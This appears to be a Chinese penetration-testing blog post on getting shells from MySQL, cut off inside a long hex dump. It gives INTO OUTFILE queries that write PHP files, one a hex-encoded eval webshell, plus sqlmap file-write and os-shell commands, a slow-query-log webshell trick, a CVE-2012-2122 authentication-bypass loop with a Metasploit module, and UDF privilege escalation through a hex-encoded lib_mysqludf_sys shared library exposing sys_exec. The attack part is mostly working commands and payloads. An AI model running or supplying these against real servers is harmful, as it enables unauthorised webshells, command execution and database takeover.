<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>DBGetShell | bo0s</title>
  <meta name="author" content="hitman">
  
  <meta name="description" content="My Blog/Website, will Tutorials, and just my general thoughts.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="DBGetShell"/>
  <meta property="og:site_name" content="bo0s"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/12favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 5.0.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">bo0s</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="å…¨éƒ¨æ–‡ç« ">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="æ ‡ç­¾">
			  <i class="fa fa-tag"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="æˆ‘æ˜¯è°.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/wiki/#/" title="WiKi.">
			  <i class="fa fa-book"></i>WiKi
			</a>
		  </li>
		  
		  <li>
			<a href="/tool" title="å·¥å…·">
			  <i class="fa fa-space-shuttle"></i>Tool
			</a>
		  </li>
		  
		  <li>
			<a href="/logs" title="æ—¥å¿—">
			  <i class="fa fa-tachometer"></i>Logs
			</a>
		  </li>
		  
		  <li>
			<a href="/code/landing/" title="Discord.JS Bot Code">
			  <i class="fa fa-code"></i>Tutorials / Code
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> DBGetShell</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p><img src="/images/SQLI.png" alt="upload successful"></p>
<blockquote>
<h2 id="æ‰¾å·¥ä½œï¼Œå¹´ååº”è¯¥å²—ä½å¯ä»¥å¼€æ”¾å‡ºæ¥äº†å§"><a href="#æ‰¾å·¥ä½œï¼Œå¹´ååº”è¯¥å²—ä½å¯ä»¥å¼€æ”¾å‡ºæ¥äº†å§" class="headerlink" title="æ‰¾å·¥ä½œï¼Œå¹´ååº”è¯¥å²—ä½å¯ä»¥å¼€æ”¾å‡ºæ¥äº†å§."></a><code>æ‰¾å·¥ä½œ</code>ï¼Œå¹´ååº”è¯¥å²—ä½å¯ä»¥å¼€æ”¾å‡ºæ¥äº†å§.</h2><h2 id="éœ€è¦æ‰¾ä¸€ä»½æ¸—é€å²—å·¥ä½œï¼Œå¦‚æœ‰éœ€è¦è¯·è”ç³»æˆ‘ğŸ“®é‚®ç®±"><a href="#éœ€è¦æ‰¾ä¸€ä»½æ¸—é€å²—å·¥ä½œï¼Œå¦‚æœ‰éœ€è¦è¯·è”ç³»æˆ‘ğŸ“®é‚®ç®±" class="headerlink" title="éœ€è¦æ‰¾ä¸€ä»½æ¸—é€å²—å·¥ä½œï¼Œå¦‚æœ‰éœ€è¦è¯·è”ç³»æˆ‘ğŸ“®é‚®ç®±"></a>éœ€è¦æ‰¾ä¸€ä»½<code>æ¸—é€å²—</code>å·¥ä½œï¼Œå¦‚æœ‰éœ€è¦è¯·è”ç³»æˆ‘<a href="mailto:ffffffff0x@qq.com">ğŸ“®é‚®ç®±</a></h2><p>ææƒæ˜¯ä¸ºäº†æ”¶é›†æ›´å¤šä¿¡æ¯æ¥ä¸ºæ›´æ·±ä¸€æ­¥æ¸—é€åšå‡†å¤‡ï¼Œä¸æ˜¯ä»…ä»…æ˜¯ä¸ºäº†ææƒè€Œå»ææƒ.</p>
</blockquote>
<a id="more"></a> 





<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="Mysql-GetShell"><a href="#Mysql-GetShell" class="headerlink" title="Mysql GetShell"></a>Mysql GetShell</h2><br/>



<h3 id="INTO-OUTFILE-Get-WebShell"><a href="#INTO-OUTFILE-Get-WebShell" class="headerlink" title="INTO OUTFILE Get WebShell"></a>INTO OUTFILE Get WebShell</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li><p>éœ€è¦æƒé™ä¸º<code>DBA</code>ï¼Œæ‹¥æœ‰æ•°æ®åº“rootæƒé™;</p>
</li>
<li><p>phpçš„ä¸»åŠ¨è½¬ä¹‰åŠŸèƒ½å…³é—­ï¼Œå¯ä»¥ä½¿ç”¨å•åŒå¼•å·(<code>GPC</code>);</p>
</li>
<li><p>çŸ¥é“ç½‘ç«™çš„<code>ç»å¯¹è·¯å¾„</code>;</p>
</li>
<li><p><code>secure_file_priv</code> æ— é™åˆ¶;</p>
</li>
</ul>
<blockquote>
<p>æŸ¥è¯¢ <code>secure_file_priv</code> æ˜¯å¦å­˜åœ¨é™åˆ¶</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &#39;%secure_file_priv%&#39;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Mysql <code>5.5</code>ä¹‹å‰ secure_file_priv é»˜è®¤ä¸º<code>ç©º</code>ï¼Œè¿™æ—¶å¯ä»¥åƒä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶ã€‚</p>
<p>Mysql <code>5.5</code>ä¹‹åsecure_file_priv é»˜è®¤ä¸º <code>NULL</code>ï¼Œè¿™æ—¶ä¸å¯å†™æ–‡ä»¶ã€‚</p>
<p>åœ¨Linuxç³»ç»Ÿä¸­æƒé™åˆ†é…è¾ƒä¸¥æ ¼,ä¸€èˆ¬æƒ…å†µä¸‹æ— æ³•ç›´æ¥å†™å…¥æ–‡ä»¶ã€‚</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">Value</th>
<th>æƒ…å†µè¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NULL</td>
<td>ä¸å…è®¸å¯¼å…¥å¯¼å‡º</td>
</tr>
<tr>
<td align="left">/tmp</td>
<td>åªå…è®¸åœ¨<code>/tmp</code>ç›®å½•å¯¼å…¥å¯¼å‡º</td>
</tr>
<tr>
<td align="left">ç©º</td>
<td>ä¸é™åˆ¶ç›®å½•</td>
</tr>
</tbody></table>
<blockquote>
<p>Write Shell</p>
</blockquote>
<blockquote>
<blockquote>
<p>æ‰‹å·¥ å†™ Shell</p>
</blockquote>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;info.php&#39;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ä¸»åŠ¨è½¬ä¹‰åŠŸèƒ½å¼€å¯çš„æƒ…å†µ</span><br><span class="line">select 1 into outfile &#39;D:&#x2F;www&#x2F;info.php&#39; lines terminated by 0x3C3F70687020406576616C28245F504F53545B2767275D293B3F3E0D0A;</span><br><span class="line"></span><br><span class="line">union select 1,0x3C3F70687020406576616C28245F504F53545B2767275D293B3F3E0D0A,3 into outfile &#39;D:&#x2F;www&#x2F;info.php&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>Sqlmap å†™ Shell</p>
</blockquote>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap    -u &quot;https://target.com/id=*&quot; --file-write=&quot;/Users/Nobody/info.php&quot; --file-dest=&quot;/var/www/hrml/info.php&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>Sqlmap è·å– os-shell</p>
</blockquote>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://target.com/id=*&quot; --os-shell</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="æ…¢æ—¥å¿—å†™-WebShell"><a href="#æ…¢æ—¥å¿—å†™-WebShell" class="headerlink" title="æ…¢æ—¥å¿—å†™ WebShell"></a>æ…¢æ—¥å¿—å†™ WebShell</h3><ul>
<li>çŸ¥é“ç½‘ç«™çš„<code>ç»å¯¹è·¯å¾„</code>;</li>
<li>éœ€è¦æƒé™ä¸º<code>DBA</code>ï¼Œæ‹¥æœ‰æ•°æ®åº“rootæƒé™;</li>
<li><code>secure_file_priv</code> æ— é™åˆ¶;</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="emphasis">&#x27;%slow_query_log%&#x27;</span>;</span><br><span class="line"><span class="code">+------------------+</span>---------------------------------+</span><br><span class="line">| Variable<span class="emphasis">_name    | Value                           |</span></span><br><span class="line"><span class="emphasis">+------------------+---------------------------------+</span></span><br><span class="line"><span class="emphasis">| slow_</span>query<span class="emphasis">_log   | OFF                             |</span></span><br><span class="line"><span class="emphasis">| slow_</span>query<span class="emphasis">_log_</span>file | /var/lib/mysql/test.log             |</span><br><span class="line"><span class="code">+------------------+</span>---------------------------------+</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å…¨å±€é…ç½®</span><br><span class="line">show variables like <span class="emphasis">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>å¼€å¯æ—¥å¿—è®°å½•</p>
</blockquote>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> global <span class="comment">show_query_log =</span> <span class="comment">&quot;ON&quot;</span>;</span><br><span class="line"><span class="keyword">set</span> global <span class="comment">show_query_log_file =</span> <span class="comment">&quot;/var/www/html/info.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ—¥å¿—å†™å…¥ Webshell</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;php? phpinfo(); ?&gt;&#x27;</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<p>å†™å…¥æˆåŠŸåé€šè¿‡åˆšæ‰çš„æ—¥å¿— <code>SHOW VARIABLES LIKE &#39;%slow_query_log%&#39;;</code>ç»“æœæ¢å¤è®¾ç½®ã€‚</p>
<br/>



<h3 id="èº«ä»½è®¤è¯ç»•è¿‡"><a href="#èº«ä»½è®¤è¯ç»•è¿‡" class="headerlink" title="èº«ä»½è®¤è¯ç»•è¿‡"></a>èº«ä»½è®¤è¯ç»•è¿‡</h3><blockquote>
<p>(CVE-2012-2122)å—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬:</p>
</blockquote>
<p>æ‰€æœ‰<code>MariaDB</code>å’Œ<code>MySQL</code>ä½äº<code>5.1.61</code>,<code> 5.2.11</code>,<code>5.3.5</code>, <code>5.5.22</code>ç‰ˆæœ¬å¯ç”¨.<br>MariaDB <code>5.1.62</code>,<code> 5.2.12</code>,<code> 5.3.6</code>,<code> 5.5.23</code>ç‰ˆæœ¬ä¸å¯ç”¨.<br>MySQL  <code>5.1.63</code>,<code> 5.5.24</code>,<code> 5.6.6</code> ç‰ˆæœ¬ä¸å¯ç”¨.</p>
<blockquote>
<p>åˆ©ç”¨æ–¹æ³•ï¼š</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linuxä½¿ç”¨</span></span><br><span class="line">$ <span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 1000`; <span class="keyword">do</span> mysql -uroot -proot -h 127.0.0.1 -P3306 ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MSFä¹Ÿæœ‰å¯¹åº”çš„æ¨¡å—</span></span><br><span class="line">msf6 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 127.0.0.1</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>

<br/>

<hr>
<br/>

<h2 id="Mysql-ææƒ"><a href="#Mysql-ææƒ" class="headerlink" title="Mysql ææƒ"></a>Mysql ææƒ</h2><br/>

<h3 id="UDPææƒ"><a href="#UDPææƒ" class="headerlink" title="UDPææƒ"></a>UDPææƒ</h3><blockquote>
<p>Use Defined Function ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œæ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ï¼Œç”¨æˆ·å¯é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å®ç°åœ¨<code>Mysql</code>ä¸­æ— æ³•å®ç°çš„åŠŸèƒ½ï¼Œå¯ä»¥åƒ<code>version()</code>ä¸€æ ·çš„æ–¹ä¾¿è°ƒç”¨ã€‚éœ€è¦å°†<code>UDF</code>æ–‡ä»¶ä¸Šä¼ åˆ°Mysqlçš„ç›®å½•ä¸­è¿›è¡Œè°ƒç”¨ã€‚ä»<code>5.0</code>å¼€å§‹æ”¯æŒUDFã€‚</p>
</blockquote>
<blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶:</p>
</blockquote>
<ul>
<li><code>secure_file_priv</code> æ— é™åˆ¶ï¼Œå¦åˆ™æ— æ³•è‡ªå®šä¹‰å¯¼å‡ºä½ç½®</li>
<li><code>CREATE</code>ã€<code>FILE</code>ç­‰æƒé™å¯ç”¨ï¼Œ<code>root</code>ç”¨æˆ·é»˜è®¤æ‹¥æœ‰å…¨éƒ¨æƒé™</li>
<li><code>plugin</code>çš„å€¼ä¸ä¸ºç©º(é»˜è®¤ä¸ä¸ºç©º)</li>
</ul>
<blockquote>
<p>æŸ¥çœ‹<code>secure_file_priv</code>çš„å€¼çœ‹æ˜¯å¦å…è®¸å¯¼å…¥å¯¼å‡ºæ–‡ä»¶ï¼š</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%secure_file_priv%&quot;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>



<blockquote>
<p>æŸ¥çœ‹å½“å‰æ•°æ®åº“ç”¨æˆ·æ‹¥æœ‰çš„æƒé™:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.user where user &#x3D; substring_index(user(), &#39;@&#39;, 1) ;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> æŸ¥çœ‹<code>plugin</code>çš„å€¼ï¼š</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select host,user,plugin from mysql.user where user &#x3D; substring_index(user(),&#39;@&#39;,1);</span><br><span class="line">+-----------+------+-----------------------+</span><br><span class="line">| host      | user | plugin                |</span><br><span class="line">+-----------+------+-----------------------+</span><br><span class="line">| localhost | root | mysql_native_password |</span><br><span class="line">+-----------+------+-----------------------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è·å–<code>plugin</code>çš„è·¯å¾„ï¼š</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;%plugin%&#39;;</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| Variable_name | Value                        |</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| plugin_dir    | &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;lib&#x2F;plugin&#x2F; |</span><br><span class="line">+---------------+------------------------------+</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç›®å½•ä¸å­˜åœ¨çš„è¯</p>
<blockquote>
<blockquote>
<ul>
<li><p>Windows</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#39;x&#39; into dumpfile &#39;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;MySQL5.7.26&#x2F;lib::$INDEX_ALLOCATION&#39;;</span><br><span class="line">select &#39;x&#39; into dumpfile &#39;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;MySQL5.7.26&#x2F;lib&#x2F;plugin&#x2F;::$INDEX_ALLOCATION&#39;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>Linux </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨WebShellåˆ›å»ºç›®å½•ã€‚</span><br></pre></td></tr></table></figure>


</li>
</ul>
</blockquote>
</blockquote>
<blockquote>
<p>è·å–æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ç¡®å®šUDFç‰ˆæœ¬:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;version_compile_%&#39;;</span><br><span class="line">+-------------------------+----------+</span><br><span class="line">| Variable_name           | Value    |</span><br><span class="line">+-------------------------+----------+</span><br><span class="line">| version_compile_machine | x86_64   |</span><br><span class="line">| version_compile_os      | osx13.31 |</span><br><span class="line">+-------------------------+----------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>



<blockquote>
<p>å†™å…¥åŠ¨æ€é“¾æ¥åº“</p>
</blockquote>
<blockquote>
<blockquote>
<p>ä½¿ç”¨mysqlä¸€é”®æ¢­å“ˆ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:30008/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --file-write=<span class="string">&quot;/Users/Nobody/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<blockquote>
<p>æ‰‹å·¥SELECTå†™å…¥åå…­è¿›åˆ¶UDFæ–‡ä»¶ï¼Œè¦ç¡®å®šç‰ˆæœ¬å†è¿›è¡Œå¯¼å…¥ï¼Œè¿™é‡Œä»¥<code>lib_mysqludf_sys_64.so</code>æ¥æ¼”ç¤ºï¼Œå½“ä¸€ä¸ªç‰ˆæœ¬å†™å…¥ä¸æˆåŠŸå¯ä»¥å†è¯•è¯•å¦ä¸€ä¸ªç‰ˆæœ¬.</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc9